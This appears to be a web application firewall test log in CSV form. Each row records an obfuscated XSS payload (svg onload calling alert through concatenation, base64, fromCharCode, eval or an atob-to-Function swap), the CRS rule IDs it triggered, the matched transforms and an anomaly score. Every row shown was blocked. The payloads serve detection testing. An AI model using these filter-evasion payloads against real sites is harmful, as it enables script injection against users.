2169,"<svg onload=""(function(){var x='a'+'le'+'rt';self[x](1);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o49,11v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,62 || o14,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,7v217,62t:urlDecodeUni,t:compressWhitespace || ",35,177603532227.060506
2170,"<svg onload=""(function(){var x=atob('YWxlcnQ');window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,11v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,9v217,66t:urlDecodeUni,t:compressWhitespace || ",30,177603532492.376409
2171,"<svg onload=""(function(){var x='a'.concat('lert');window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o56,11v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,69t:urlDecodeUni,t:compressWhitespace || ",30,177603532554.827867
2172,"<svg onload=""(function(){var x=['a','l','e','r','t'].join('');window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o68,11v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,9v217,81t:urlDecodeUni,t:compressWhitespace || ",30,177603532627.557073
2175,"<svg onload=""(function(){var x='a'+'ler'+'t';globalThis[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o55,11v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,68 || o14,11v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603533054.163113
2176,"<svg onload=""(function(){var x=String['fromCharCode'](97,108,101,114,116);window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o37,54v217,93t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o74,9v217,93t:urlDecodeUni,t:compressWhitespace || ",30,177603533187.728282
2177,"<svg onload=""(function(){var x='al'+'ert';top[x](1);})()"">",0,1,block,9,"932105,933210,934100,934100,941100,941120,941160,941370,949110","o41,4v217,58 || o45,11v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,58 || o14,11v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,6v217,58t:urlDecodeUni,t:compressWhitespace || ",40,177603533275.182543
2179,"<svg onload=""(function(){var x='a\154ert';window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o48,11v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,9v217,61t:urlDecodeUni,t:compressWhitespace || ",30,177603533543.563172
2180,"<svg onload=""(function(){var x='a'+'l'+'e'+'r'+'t';window[x](1);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o57,11v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || o14,11v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o51,9v217,70t:urlDecodeUni,t:compressWhitespace || ",35,177603533689.774023
2181,"<svg onload=""(function(){var x=unescape('%61%6c%65%72%74');window[x](1);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,11v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,78 || o14,11v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o49,9v217,78t:urlDecodeUni,t:compressWhitespace || ",35,177603533797.852230
2182,"<svg onload=""(function(){var x='aler'+'t';this[x](1);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o46,11v217,59t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,59 || o14,11v217,59t:urlDecodeUni || v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,7v217,59t:urlDecodeUni,t:compressWhitespace || ",35,177603533868.860537
2183,"<svg onload=""(function(){var x='ale'+'rt';parent[x](1);})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o48,11v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,61 || o14,11v217,61t:urlDecodeUni || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603534094.107979
2184,"<svg onload=""(function(){var x=['a','le','rt'].join('');window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o62,11v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,9v217,75t:urlDecodeUni,t:compressWhitespace || ",30,17760353417.708238
2185,"<svg onload=""(function(){var x='al'.concat('ert');window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o56,11v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,69t:urlDecodeUni,t:compressWhitespace || ",30,177603534228.437044
2186,"<svg onload=""(function(){var x=decodeURI('%61lert');window[x](1);})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o56,11v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,71 || o14,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,9v217,71t:urlDecodeUni,t:compressWhitespace || ",35,177603534311.328419
2187,"<svg onload=""(function(){var x=atob('YWxlcnQ');self[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,11v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,7v217,64t:urlDecodeUni,t:compressWhitespace || ",30,177603534460.954630
2188,"<svg onload=""(function(){var x=atob('YWxlcnQ');top[x](1);})()"">",0,1,block,8,"932105,933210,934100,941100,941120,941160,941370,949110","o46,4v217,63 || o50,11v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,6v217,63t:urlDecodeUni,t:compressWhitespace || ",35,177603534631.868841
2189,"<svg onload=""(function(){var x=atob('YWxlcnQ');parent[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,11v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603534766.909462
2190,"<svg onload=""(function(){var x=atob('YWxlcnQ');this[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,11v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,7v217,64t:urlDecodeUni,t:compressWhitespace || ",30,17760353480.163402
2191,"<svg onload=""(function(){var x=atob('YWxlcnQ');globalThis[x](1);})()"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o57,11v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760353496.020799
2194,"<svg onload=""(function(){var x=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o83,11v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v217,96t:urlDecodeUni,t:compressWhitespace || ",30,177603535346.230603
2197,"<svg onload=""(function(){var x=atob('YWxlcnQ');eval('window[x](1)');})()"">",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o46,5v217,74 || o47,25v217,74 || o51,21v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v217,74t:urlDecodeUni,t:compressWhitespace || ",40,177603535776.855059
2198,"<svg onload=""(function(){var x=atob('YWxlcnQ');setTimeout(x+'(1)',0);})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,75 || o14,11v217,75t:urlDecodeUni || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603535846.589699
2199,"<svg onload=""(function(){var x=atob('YWxlcnQ');setInterval(x+'(1)',0);})()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,76 || o14,11v217,76t:urlDecodeUni || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603535983.511857
2200,"<svg onload=""(function(){var x=atob('YWxlcnQ');new Function(x+'(1)')();})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o59,16v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,77 || o14,11v217,77t:urlDecodeUni || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603536037.624456
2202,"<svg onload=""(function(){var x=atob('YWxlcnQ');return window[x](1);})()"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o60,11v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o54,9v217,73t:urlDecodeUni,t:compressWhitespace || ",30,177603536359.047618
2203,"<svg onload=""(function(){var x=atob('YWxlcnQ');with(window)eval(x+'(1)');})()"">",0,1,block,7,"933160,934100,934100,941100,941120,941160,949110","o59,18v217,79 || o14,11v217,79 || o14,11v217,79t:urlDecodeUni || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760353647.984294
2204,"<svg onload=""(function(){var x=atob('YWxlcnQ');window['ev'+'al'](x+'(1)');})()"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o53,25v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,80 || o14,11v217,80t:urlDecodeUni || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,17v217,80t:urlDecodeUni,t:compressWhitespace || ",35,177603536578.478398
2205,"<svg onload=""(function(){var x=atob('YWxlcnQ');(function(){return this})()[x](1);})()"">",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o46,10v217,87 || o47,38v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603536660.065757
2206,"<svg onload=""(function(){window['atob']=Function;atob(String['fromCharCode'](97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o53,71v217,132t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,132 || v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,132t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,14v217,132t:urlDecodeUni,t:compressWhitespace || ",30,177603536739.771018
2208,"<svg onload=""(function(){window['a'+'tob']=Function;this['atob'](String['from'+'CharCode'](97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o56,82v217,146t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,146 || o14,11v217,146t:urlDecodeUni || v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,146t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,17v217,146t:urlDecodeUni,t:compressWhitespace || ",35,177603536954.995752
2209,"<svg onload=""(function(){self['atob']=Function;self['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o51,76v217,135t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,135 || v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,12v217,135t:urlDecodeUni,t:compressWhitespace || ",30,177603537195.152648
2210,"<svg onload=""(function(){globalThis['atob']=Function;globalThis['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o63,76v217,147t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,147 || v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603537274.348051
2211,"<svg onload=""(function(){window[String.fromCharCode(97,116,111,98)]=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,157 || v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,42v217,157t:urlDecodeUni,t:compressWhitespace || ",25,177603537319.249962
2212,"<svg onload=""(function(){window['&#97;&#116;&#111;&#98;']=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,147 || v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,32v217,147t:urlDecodeUni,t:compressWhitespace || ",25,177603537429.487871
2214,"<svg onload=""(function(){with(window)atob=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603537675.270997
2215,"<svg onload=""(function(){top['atob']=Function;top['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,8,"932105,933210,934100,941100,941120,941160,941370,949110","o22,6v217,133 || o49,76v217,133t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,133 || v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,11v217,133t:urlDecodeUni,t:compressWhitespace || ",35,177603537729.336227
2216,"<svg onload=""(function(){parent['atob']=Function;parent['atob'](String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o55,76v217,139t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603537994.159915
2217,"<svg onload=""(function(){window[`atob`]=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,14v217,129t:urlDecodeUni,t:compressWhitespace || ",25,177603538057.423026
2218,"<svg onload=""(function(){window['\u0061\u0074\u006f\u0062']=Function;atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,149 || v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,34v217,149t:urlDecodeUni,t:compressWhitespace || ",25,177603538194.192973
2219,"<svg onload=""(function(){Reflect.set(window,'atob',Function);atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,141 || v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603538284.747135
2220,"<svg onload=""(function(){Object.defineProperty(window,'atob',{value:Function});atob(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))()}())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,159 || v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603538333.745627
